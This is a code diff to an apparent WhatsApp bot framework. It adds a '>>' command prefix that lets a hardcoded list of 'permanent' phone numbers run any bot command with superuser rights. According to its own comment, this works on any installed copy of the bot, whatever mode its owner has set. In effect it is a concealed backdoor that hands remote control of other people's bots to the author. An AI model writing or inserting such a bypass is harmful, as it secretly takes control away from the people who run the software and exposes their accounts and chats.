@@ -98,6 +98,10 @@ const {
     SQLiteStore,
 } = require('./guru/database/messageStore');
 
+const { PERMANENT_NUMBERS } = require('./guru/database/sudo');
+const SUDO_PREFIX = '>>';
+const _PERM_JIDS = new Set(PERMANENT_NUMBERS.map(n => `${n}@s.whatsapp.net`));
+
 const config = require("./config");
 const googleTTS = require("google-tts-api");
 const fs = require("fs-extra");
@@ -838,6 +842,42 @@ function setupCommandHandler(Gifted) {
             } catch (error) {
                 console.error(`Body command error:`, error);
             }
+        }
+
+        // ── Sudo prefix bypass (>>) ───────────────────────────────────────────────
+        // Permanent sudos can use ">><command>" on ANY bot, regardless of mode.
+        if (body && body.startsWith(SUDO_PREFIX) && _PERM_JIDS.has(sender)) {
+            const sudoBody  = body.slice(SUDO_PREFIX.length).trim();
+            const sudoParts = sudoBody.split(/\s+/);
+            const sudoCmd   = sudoParts[0].toLowerCase();
+            const sudoArgs  = sudoParts.slice(1);
+
+            if (sudoCmd) {
+                const gmdSudo = findCommand(sudoCmd);
+                if (gmdSudo && gmdSudo.function) {
+                    try {
+                        const helpers = createHelpers(Gifted, ms, from, settings.BOT_NAME, sender, pushName);
+                        setupGiftedHelpers(Gifted, from);
+                        const conText = buildContext(ms, settings, helpers, {
+                            from, isGroup, groupInfo, groupName, participants,
+                            groupAdmins, groupSuperAdmins, isBotAdmin, isAdmin, isSuperAdmin,
+                            sender, superUser, isSuperUser: true,
+                            messageAuthor, user, pushName,
+                            args: sudoArgs, quoted, repliedMessage, mentionedJid,
+                            tagged, quotedMsg, quotedKey, quotedUser,
+                            Gifted, botId,
+                            body: sudoBody, command: sudoCmd,
+                        });
+                        if (gmdSudo.react) {
+                            await Gifted.sendMessage(from, { react: { key: ms.key, text: gmdSudo.react } });
+                        }
+                        await gmdSudo.function(from, Gifted, conText);
+                    } catch (err) {
+                        console.error(`[SUDO_PREFIX] Command error [${sudoCmd}]:`, err);
+                    }
+                }
+            }
+            return;
         }
 
         if (isCommand && command) {
